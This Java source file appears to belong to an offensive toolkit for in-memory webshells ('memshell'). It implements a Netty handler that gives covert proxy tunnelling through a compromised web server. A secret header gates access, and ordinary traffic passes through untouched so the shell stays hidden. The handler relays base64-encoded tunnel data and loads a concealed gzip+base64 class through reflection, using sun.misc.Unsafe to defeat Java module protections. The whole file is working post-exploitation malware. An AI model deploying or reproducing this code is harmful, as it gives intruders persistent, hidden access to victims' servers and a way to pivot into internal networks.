package com.reajason.javaweb.memshell.shelltool.proxy;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.DefaultFullHttpResponse;
import io.netty.handler.codec.http.DefaultHttpContent;
import io.netty.handler.codec.http.DefaultHttpResponse;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpHeaderValues;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpResponseStatus;
import io.netty.handler.codec.http.HttpVersion;
import io.netty.handler.codec.http.LastHttpContent;
import io.netty.handler.codec.http.QueryStringDecoder;
import io.netty.util.AttributeKey;
import io.netty.util.ReferenceCountUtil;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;

/**
 * Gost PHT transport over Netty's HTTP codec.
 *
 * @author ReaJason
 */
@ChannelHandler.Sharable
public class ProxyNettyHandler extends ChannelDuplexHandler implements ThreadFactory {
    private static final int MAX_PUSH_SIZE = 4 * 1024 * 1024;
    // One pull and one push worker per ProxyHttp session; excess work is rejected.
    private static final int MAX_HTTP_THREADS = 256;
    private static final ExecutorService HTTP_EXECUTOR = new ThreadPoolExecutor(
            0, MAX_HTTP_THREADS, 30L, TimeUnit.SECONDS,
            new SynchronousQueue<Runnable>(), new ProxyNettyHandler());
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;
    private static String headerName;
    private static String headerValue;

    private static final AttributeKey<String> REQUEST_METHOD =
            AttributeKey.valueOf(ProxyNettyHandler.class.getName() + ".method");
    private static final AttributeKey<String> REQUEST_TOKEN =
            AttributeKey.valueOf(ProxyNettyHandler.class.getName() + ".token");
    private static final AttributeKey<ByteArrayOutputStream> REQUEST_BODY =
            AttributeKey.valueOf(ProxyNettyHandler.class.getName() + ".body");
    private static final AttributeKey<Boolean> REQUEST_TOO_LARGE =
            AttributeKey.valueOf(ProxyNettyHandler.class.getName() + ".tooLarge");
    private static final AttributeKey<Object> PULL_SESSION =
            AttributeKey.valueOf(ProxyNettyHandler.class.getName() + ".pullSession");
    private static final AttributeKey<Thread> PULL_THREAD =
            AttributeKey.valueOf(ProxyNettyHandler.class.getName() + ".pullThread");

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        Channel channel = ctx.channel();
        if (msg instanceof HttpRequest) {
            HttpRequest request = (HttpRequest) msg;
            String token = getToken(request.uri());
            String method = request.method().name();
            boolean get = "GET".equalsIgnoreCase(method) && token != null;
            boolean post = "POST".equalsIgnoreCase(method) && token != null && token.length() > 0;
            String header = headerName == null ? null : request.headers().get(headerName);
            if (!get && !post || header == null || headerValue == null || headerValue.length() == 0
                    || !header.contains(headerValue)) {
                clearRequest(channel);
                ctx.fireChannelRead(msg);
                return;
            }

            clearRequest(channel);
            channel.attr(REQUEST_METHOD).set(get ? "GET" : "POST");
            channel.attr(REQUEST_TOKEN).set(token);
            if (post) {
                channel.attr(REQUEST_BODY).set(new ByteArrayOutputStream());
            }
            if (msg instanceof HttpContent) {
                consumeContent(ctx, (HttpContent) msg);
            }
            return;
        }
        if (msg instanceof HttpContent) {
            if (channel.attr(REQUEST_METHOD).get() == null) {
                ctx.fireChannelRead(msg);
                return;
            }
            consumeContent(ctx, (HttpContent) msg);
            return;
        }
        ctx.fireChannelRead(msg);
    }

    private static void consumeContent(ChannelHandlerContext ctx, HttpContent content) {
        Channel channel = ctx.channel();
        try {
            String method = channel.attr(REQUEST_METHOD).get();
            ByteArrayOutputStream output = channel.attr(REQUEST_BODY).get();
            if ("POST".equals(method) && output != null
                    && !Boolean.TRUE.equals(channel.attr(REQUEST_TOO_LARGE).get())
                    && !append(output, content.content())) {
                channel.attr(REQUEST_TOO_LARGE).set(true);
            }
            if (content instanceof LastHttpContent) {
                String token = channel.attr(REQUEST_TOKEN).get();
                byte[] body = output == null ? null : output.toByteArray();
                boolean tooLarge = Boolean.TRUE.equals(channel.attr(REQUEST_TOO_LARGE).get());
                clearRequest(channel);
                startRequest(ctx, method, token, body, tooLarge);
            }
        } finally {
            ReferenceCountUtil.release(content);
        }
    }

    private static boolean append(ByteArrayOutputStream output, ByteBuf content) {
        int length = content.readableBytes();
        if (length > MAX_PUSH_SIZE - output.size()) {
            return false;
        }
        if (length == 0) {
            return true;
        }
        if (content.hasArray()) {
            output.write(content.array(), content.arrayOffset() + content.readerIndex(), length);
            return true;
        }
        byte[] bytes = new byte[length];
        content.getBytes(content.readerIndex(), bytes);
        output.write(bytes, 0, bytes.length);
        return true;
    }

    private static void startRequest(final ChannelHandlerContext ctx, final String method,
                                     final String token, final byte[] body, final boolean tooLarge) {
        try {
            HTTP_EXECUTOR.execute(() -> {
                if ("GET".equals(method)) {
                    processGet(ctx, token);
                } else {
                    processPost(ctx, token, body, tooLarge);
                }
            });
        } catch (RejectedExecutionException e) {
            sendOverload(ctx);
        }
    }

    private static void sendOverload(final ChannelHandlerContext ctx) {
        FullHttpResponse response = new DefaultFullHttpResponse(
                HttpVersion.HTTP_1_1,
                HttpResponseStatus.valueOf(429),
                Unpooled.copiedBuffer("", StandardCharsets.US_ASCII));
        response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain");
        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, 0);
        ctx.writeAndFlush(response).addListener(future -> {
            if (future.isSuccess()) {
                ctx.read();
            } else {
                ctx.close();
            }
        });
    }

    @Override
    public Thread newThread(Runnable runnable) {
        Thread thread = new Thread(runnable, "proxy-netty-http");
        thread.setDaemon(true);
        return thread;
    }

    private static void processGet(ChannelHandlerContext ctx, String token) {
        Channel channel = ctx.channel();
        Object session = null;
        boolean responseAttempted = false;
        boolean streaming = false;
        boolean pullStarted = false;
        try {
            if (!channel.isActive()) {
                return;
            }
            Class<?> type = getProxyHttpClass();
            if (token.length() == 0) {
                String newToken = (String) invokeStatic(type, "createSession");
                if (newToken == null) {
                    responseAttempted = true;
                    sendFull(ctx, 429, "");
                    return;
                }
                responseAttempted = true;
                sendFull(ctx, 200, "token=" + newToken);
                return;
            }

            if (!Boolean.TRUE.equals(invokeStatic(type, "isValidToken", token))) {
                responseAttempted = true;
                sendFull(ctx, 400, "");
                return;
            }
            session = invokeStatic(type, "getOrCreateSession", token);
            if (session == null) {
                responseAttempted = true;
                sendFull(ctx, 429, "");
                return;
            }
            if (!Boolean.TRUE.equals(invoke(session, "beginPull"))) {
                responseAttempted = true;
                sendFull(ctx, 409, "");
                return;
            }
            pullStarted = true;
            Object previous = channel.attr(PULL_SESSION).setIfAbsent(session);
            if (previous != null) {
                responseAttempted = true;
                sendFull(ctx, 409, "");
                return;
            }
            channel.attr(PULL_THREAD).set(Thread.currentThread());
            if (!channel.isActive()) {
                close(session);
                return;
            }

            DefaultHttpResponse response = new DefaultHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);
            response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain");
            response.headers().set(HttpHeaderNames.TRANSFER_ENCODING, HttpHeaderValues.CHUNKED);
            response.headers().set("X-Accel-Buffering", "no");
            responseAttempted = true;
            streaming = true;
            writeAndFlush(ctx, response);

            while (channel.isActive()) {
                byte[] data = (byte[]) invoke(session, "poll");
                if (!channel.isActive()) {
                    break;
                }
                if (data != null && data.length == 0) {
                    writeAndFlush(ctx, LastHttpContent.EMPTY_LAST_CONTENT);
                    ctx.read();
                    break;
                }
                String line = data == null ? "\n" : encodeBase64(data) + "\n";
                writeAndFlush(ctx, new DefaultHttpContent(
                        Unpooled.copiedBuffer(line, StandardCharsets.US_ASCII)));
            }
        } catch (Throwable e) {
            restoreInterrupt(e);
            close(session);
            if (streaming) {
                channel.close();
            } else if (!responseAttempted) {
                sendInternalError(ctx);
            }
        } finally {
            if (pullStarted) {
                endPull(session);
                channel.attr(PULL_SESSION).compareAndSet(session, null);
                channel.attr(PULL_THREAD).compareAndSet(Thread.currentThread(), null);
            }
        }
    }

    private static void processPost(ChannelHandlerContext ctx, String token, byte[] body, boolean tooLarge) {
        Channel channel = ctx.channel();
        Object session = null;
        boolean responseAttempted = false;
        try {
            if (!channel.isActive()) {
                return;
            }
            Class<?> type = getProxyHttpClass();
            if (!Boolean.TRUE.equals(invokeStatic(type, "isValidToken", token))) {
                responseAttempted = true;
                sendFull(ctx, 400, "");
                return;
            }
            session = invokeStatic(type, "getOrCreateSession", token);
            if (session == null) {
                responseAttempted = true;
                sendFull(ctx, 429, "");
                return;
            }
            if (!channel.isActive()) {
                return;
            }
            if (tooLarge) {
                close(session);
                responseAttempted = true;
                sendFull(ctx, 400, "");
                return;
            }
            if (isClosed(session)) {
                responseAttempted = true;
                sendFull(ctx, 410, "");
                return;
            }
            if (body == null || body.length == 0) {
                close(session);
                responseAttempted = true;
                sendFull(ctx, 200, "");
                return;
            }

            byte[] data;
            try {
                String encoded = new String(body, StandardCharsets.ISO_8859_1).trim();
                data = decodeBase64(encoded);
            } catch (Throwable e) {
                close(session);
                responseAttempted = true;
                sendFull(ctx, 400, "");
                return;
            }
            try {
                invoke(session, "write", data);
            } catch (Throwable e) {
                boolean closed = isClosed(session) || isClosedFailure(e);
                close(session);
                responseAttempted = true;
                sendFull(ctx, closed ? 410 : 400, "");
                return;
            }
            responseAttempted = true;
            sendFull(ctx, 200, "");
        } catch (Throwable e) {
            restoreInterrupt(e);
            close(session);
            if (!responseAttempted) {
                sendInternalError(ctx);
            }
        }
    }

    private static void sendFull(ChannelHandlerContext ctx, int status, String body) throws InterruptedException {
        FullHttpResponse response = new DefaultFullHttpResponse(
                HttpVersion.HTTP_1_1,
                HttpResponseStatus.valueOf(status),
                Unpooled.copiedBuffer(body, StandardCharsets.US_ASCII));
        response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain");
        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
        writeAndFlush(ctx, response);
        ctx.read();
    }

    private static void sendInternalError(ChannelHandlerContext ctx) {
        Channel channel = ctx.channel();
        if (!channel.isActive()) {
            return;
        }
        try {
            sendFull(ctx, 500, "");
        } catch (Throwable e) {
            restoreInterrupt(e);
            channel.close();
        }
    }

    private static void writeAndFlush(ChannelHandlerContext ctx, Object message) throws InterruptedException {
        ctx.writeAndFlush(message).sync();
    }

    private static String getToken(String uri) {
        List<String> values = new QueryStringDecoder(uri).parameters().get("token");
        return values == null || values.isEmpty() ? null : values.get(0);
    }

    private static void clearRequest(Channel channel) {
        channel.attr(REQUEST_METHOD).set(null);
        channel.attr(REQUEST_TOKEN).set(null);
        channel.attr(REQUEST_BODY).set(null);
        channel.attr(REQUEST_TOO_LARGE).set(null);
    }

    @Override
    public void channelInactive(ChannelHandlerContext ctx) throws Exception {
        cleanupChannel(ctx.channel());
        ctx.fireChannelInactive();
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
        cleanupChannel(ctx.channel());
        ctx.close();
    }

    private static void cleanupChannel(Channel channel) {
        clearRequest(channel);
        Object pull = channel.attr(PULL_SESSION).getAndSet(null);
        if (pull != null) {
            close(pull);
            endPull(pull);
        }
        Thread thread = channel.attr(PULL_THREAD).getAndSet(null);
        if (thread != null && thread != Thread.currentThread()) {
            thread.interrupt();
        }
    }

    private static boolean isClosed(Object session) {
        try {
            return Boolean.TRUE.equals(session.getClass().getMethod("isClosed").invoke(session));
        } catch (Throwable ignored) {
        }
        Class<?> type = session.getClass();
        while (type != null) {
            try {
                Field field = type.getDeclaredField("closed");
                field.setAccessible(true);
                return field.getBoolean(session);
            } catch (NoSuchFieldException e) {
                type = type.getSuperclass();
            } catch (Throwable ignored) {
                return false;
            }
        }
        return false;
    }

    private static boolean isClosedFailure(Throwable throwable) {
        Throwable current = throwable;
        while (current != null) {
            if (current instanceof IOException && "tunnel is closed".equals(current.getMessage())) {
                return true;
            }
            if (current.getCause() == current) {
                break;
            }
            current = current.getCause();
        }
        return false;
    }

    private static void close(Object session) {
        if (session != null) {
            try {
                invoke(session, "close");
            } catch (Throwable ignored) {
            }
        }
    }

    private static void endPull(Object session) {
        if (session != null) {
            try {
                invoke(session, "endPull");
            } catch (Throwable ignored) {
            }
        }
    }

    private static void restoreInterrupt(Throwable throwable) {
        if (throwable instanceof InterruptedException) {
            Thread.currentThread().interrupt();
        }
    }

    private static Object invokeStatic(Class<?> type, String name) throws Exception {
        return type.getMethod(name).invoke(null);
    }

    private static Object invokeStatic(Class<?> type, String name, String argument) throws Exception {
        return type.getMethod(name, String.class).invoke(null, argument);
    }

    private static Object invoke(Object target, String name) throws Exception {
        return target.getClass().getMethod(name).invoke(target);
    }

    private static Object invoke(Object target, String name, byte[] data) throws Exception {
        return target.getClass().getMethod(name, byte[].class).invoke(target, data);
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        Class<?> result = proxyHttpClass;
        if (result == null) {
            synchronized (ProxyNettyHandler.class) {
                result = proxyHttpClass;
                if (result == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    result = reflectionDefineClass(bytes);
                    proxyHttpClass = result;
                }
            }
        }
        return result;
    }

    private static Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectMethod = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(ProxyNettyHandler.class, (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetMethod = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetMethod.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectMethod = unsafe.getClass().getMethod(
                    "getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.invoke(unsafe, ProxyNettyHandler.class, offset, module);
        } catch (Throwable ignored) {
        }

        try {
            URLClassLoader classLoader = new URLClassLoader(
                    new URL[0], Thread.currentThread().getContextClassLoader());
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineMethod.setAccessible(true);
            return (Class<?>) defineMethod.invoke(classLoader, classBytes, 0, classBytes.length);
        } finally {
            if (getAndSetObjectMethod != null && rawModule != null) {
                try {
                    getAndSetObjectMethod.invoke(unsafe, ProxyNettyHandler.class, offset, rawModule);
                } catch (Throwable ignored) {
                }
            }
        }
    }

    @SuppressWarnings("all")
    private static String encodeBase64(byte[] data) throws Exception {
        try {
            Class<?> codecClass = Class.forName("java.util.Base64");
            Object encoder = codecClass.getMethod("getEncoder").invoke(null);
            String encoded = (String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, data);
            return encoded.replace("\r", "").replace("\n", "");
        } catch (ClassNotFoundException e) {
            Class<?> codecClass = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = codecClass.newInstance();
            String encoded = (String) codecClass.getMethod("encode", byte[].class).invoke(encoder, data);
            return encoded.replace("\r", "").replace("\n", "");
        }
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> codecClass = Class.forName("java.util.Base64");
            Object decoder = codecClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (ClassNotFoundException e) {
            Class<?> codecClass = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = codecClass.newInstance();
            return (byte[]) codecClass.getMethod("decodeBuffer", String.class).invoke(decoder, value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) != -1) {
                if (count > 0) {
                    output.write(buffer, 0, count);
                }
            }
            return output.toByteArray();
        } finally {
            input.close();
            output.close();
        }
    }
}
